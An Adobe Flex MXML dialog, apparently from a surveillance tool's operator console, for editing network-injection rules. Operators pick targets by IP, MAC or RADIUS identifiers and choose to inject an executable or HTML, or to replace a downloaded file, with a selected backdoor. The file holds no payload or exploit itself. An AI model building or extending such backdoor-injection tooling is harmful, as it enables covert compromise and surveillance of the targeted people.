<?xml version="1.0" encoding="utf-8"?>
<utils:TitleWindowSaveClose xmlns:fx="http://ns.adobe.com/mxml/2009"
                            xmlns:s="library://ns.adobe.com/flex/spark"
                            xmlns:utils="it.ht.rcs.console.utils.*"
                            xmlns:mx="library://ns.adobe.com/flex/mx"
                            xmlns:items="it.ht.rcs.console.utils.items.*"
                            creationComplete="init()" creationPolicy="all" currentState="normal"
                            save="save()"
                            skinClass="it.ht.rcs.console.skins.TitleWindowSaveCloseSkin"
                            title="{R.get('EDIT_RULE')}">
  
  
  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.events.UploadEvent;
      import it.ht.rcs.console.network.model.ProxyRule;
      
      import locale.R;
      
      import mx.managers.PopUpManager;
      
      [Bindable]
      public var rule:ProxyRule;
      
      public var mode:String = 'edit';
      
      private var fileReference:FileReference;
      private var fileChanged:Boolean = false;
      
      public function init():void
      {
        probability.value = rule.probability;
        ident.selectedItem = rule.ident;
        action.selectedItem = rule.action;
        if (rule.action == 'REPLACE') {
          currentState = 'fileSelected';
          fileName.text = rule.action_param_name;
        } else {
          for each (var bd:Object in backdoors.dataProvider)
          if (bd._id == rule.action_param) {
            backdoors.selectedItem = bd;
            break;
          }
        }
      }
      
      private function save():void
      {
        
        if (action.selectedItem !== replace) {
          manageInject();
        } else {
//          if (mode == 'create' && fileReference == null) {
//            AlertPopUp.show('please choose a file');
//            return;
//          }
          if (fileChanged)
            manageReplaceWithUpload();
          else
            manageReplace();
        }
        
      }
      
      private function manageInject():void
      {
        populateCommonProperties();
        rule.action_param = backdoors.selectedItem._id;
        
        close();
      }
      
      private var uploadPopup:UploadPopup; 
      private function manageReplaceWithUpload():void
      {
        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
        uploadPopup.addEventListener(UploadEvent.COMPLETE, complete);
        PopUpManager.centerPopUp(uploadPopup);  
      }
      
      private function complete(event:UploadEvent):void
      {
        PopUpManager.removePopUp(uploadPopup);
        populateCommonProperties();
        rule.action_param = event.itemId;
        rule.action_param_name = fileReference.name;
        
        close();
      }
      
      private function manageReplace():void
      {
        populateCommonProperties();
        
        close();
      }
      
      private function populateCommonProperties():void
      {
        rule.enabled = isEnabled.selected;
        rule.disable_sync = sync.selected;
        rule.probability = probability.value;
        rule.target_id = target.selectedItem;
        rule.ident = ident.selectedItem;
        rule.ident_param = ident_param.text;
        rule.resource = resource.text;
        rule.action = action.selectedItem;
      }
      
      private function browse():void
      {
        fileReference = new FileReference();
        fileReference.addEventListener(Event.SELECT, fileSelect);
        fileReference.browse();
      }
      
      private function fileSelect(event:Event):void
      {
        currentState = 'fileSelected';
        fileName.text = event.target.name;
      }
      
      private function changeFile():void
      {
        fileChanged = true;
        browse();
      }
      
    ]]>
  </fx:Script>
  
  <fx:Declarations>
    <s:ArrayCollection id="dataProvider">
      
      <fx:Object label="Targets" separator="true" type="target"/>
      <fx:Object label="Backdoors" separator="true" type="backdoor"/>
      <fx:Object label="Evidences" separator="true" type="evidence"/>
      <fx:Object label="Operations" separator="true" type="operation"/>
      
      <fx:Object label="Target 1" type="target"/>
      <fx:Object label="Backdoor 1" type="backdoor"/>
      <fx:Object label="Evidence 1" type="evidence"/>
      <fx:Object label="Operation 1" type="operation"/>
      
      <fx:Object label="Target 2" type="target"/>
      <fx:Object label="Backdoor 2" type="backdoor"/>
      <fx:Object label="Evidence 2" type="evidence"/>
      <fx:Object label="Operation 2" type="operation"/>
      
      <fx:Object label="Target 3" type="target"/>
      <fx:Object label="Backdoor 3" type="backdoor"/>
      <fx:Object label="Evidence 3" type="evidence"/>
      <fx:Object label="Operation 3" type="operation"/>
      
      <fx:Object label="Target 4" type="target"/>
      <fx:Object label="Backdoor 4" type="backdoor"/>
      <fx:Object label="Evidence 4" type="evidence"/>
      <fx:Object label="Operation 4" type="operation"/>
      
      <fx:Object label="Target 5" type="target"/>
      <fx:Object label="Backdoor 5" type="backdoor"/>
      <fx:Object label="Evidence 5" type="evidence"/>
      <fx:Object label="Operation 5" type="operation"/>
      
      <fx:Object label="Target 6" type="target"/>
      <fx:Object label="Backdoor 6" type="backdoor"/>
      <fx:Object label="Evidence 6" type="evidence"/>
      <fx:Object label="Operation 6" type="operation"/>
      
      <fx:Object label="Target 7" type="target"/>
      <fx:Object label="Backdoor 7" type="backdoor"/>
      <fx:Object label="Evidence 7" type="evidence"/>
      <fx:Object label="Operation 7" type="operation"/>
      
    </s:ArrayCollection>
  </fx:Declarations>
  
  <utils:states>
    <s:State name="normal"/>
    <s:State name="fileSelected"/>
  </utils:states>
  
  <s:Form left="5" right="5" bottom="15" skinClass="it.ht.rcs.console.skins.CompactForm">
    
    <s:FormItem label="{R.get('ENABLED')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:CheckBox id="isEnabled" selected="{rule.enabled}"/>
    </s:FormItem>
    
    <s:FormItem label="{R.get('DISABLE_ON_SYNC')}"
                skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:CheckBox id="sync" selected="{rule.disable_sync}"/>
    </s:FormItem>
    
    <s:FormItem label="{R.get('PROBABILITY')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:HSlider id="probability" width="200" maximum="100" minimum="0" snapInterval="1" stepSize="1"
                 value="50"/>
    </s:FormItem>
    
    <s:FormItem label="{R.get('TARGET')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:DropDownList id="target" width="200"></s:DropDownList>
    </s:FormItem>
    
    <s:FormItem label="{R.get('TARGET')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <items:SearchField id="target2" width="200" dataProvider="{dataProvider}" types="{['target']}"></items:SearchField>
    </s:FormItem>
    
    <s:FormItem label="{R.get('IDENT')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:DropDownList id="ident" width="200" requireSelection="true">
        <s:dataProvider>
          <s:ArrayCollection>
            <fx:String>STATIC-IP</fx:String>
            <fx:String>STATIC-MAC</fx:String>
            <fx:String>DHCP</fx:String>
            <fx:String>RADIUS-LOGIN</fx:String>
            <fx:String>RADIUS-CALLID</fx:String>
            <fx:String>RADIUS-SESSID</fx:String>
            <fx:String>RADIUS-TECHKEY</fx:String>
            <fx:String>STRING-CLIENT</fx:String>
            <fx:String>STRING-SERVER</fx:String>
          </s:ArrayCollection>
        </s:dataProvider>
      </s:DropDownList>
    </s:FormItem>
    
    <s:FormItem label="{R.get('USER_PATTERN')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:TextInput id="ident_param" width="200" text="{rule.ident_param}"/>
    </s:FormItem>
    
    <s:FormItem label="{R.get('RESOURCE_PATTERN')}"
                skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:TextInput id="resource" width="200" text="{rule.resource}"/>
    </s:FormItem>
    
    <s:FormItem label="{R.get('ACTION')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:DropDownList id="action" width="200" change="{currentState = 'normal'}"
                      requireSelection="true">
         <s:dataProvider>
           <s:ArrayCollection>
             <fx:String id="injectExe">INJECT-EXE</fx:String>
             <fx:String id="injectHtml">INJECT-HTML</fx:String>
             <fx:String id="replace">REPLACE</fx:String>
           </s:ArrayCollection>
         </s:dataProvider>
       </s:DropDownList>
    </s:FormItem>
    
    <s:FormItem visible="{action.selectedItem !== replace}" label="{R.get('BACKDOOR')}"
                includeInLayout="{action.selectedItem !== replace}"
                skinClass="it.ht.rcs.console.skins.CompactFormItem">
      <s:DropDownList id="backdoors" width="200" labelField="name" requireSelection="true">
        <s:dataProvider>
          <s:ArrayCollection>
            <fx:Object _id="RCS_0001" name="RCS_0001"/>
            <fx:Object _id="RCS_0002" name="RCS_0002"/>
          </s:ArrayCollection>
        </s:dataProvider>
      </s:DropDownList>
    </s:FormItem>
    
    <s:FormItem visible="{action.selectedItem === replace}" label="{R.get('FILE')}"
                includeInLayout="{action.selectedItem === replace}"
                skinClass="it.ht.rcs.console.skins.CompactFormItem">
      
      <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}" click="browse()"/>
      
      <s:Label id="fileName" includeIn="fileSelected" width="200" buttonMode="true"
               click="changeFile()" maxDisplayedLines="1" paddingTop="8"
               toolTip="{R.get('CLICK_TO_CHANGE_FILE')}" verticalAlign="middle"/>
      
    </s:FormItem>
    
  </s:Form>

</utils:TitleWindowSaveClose>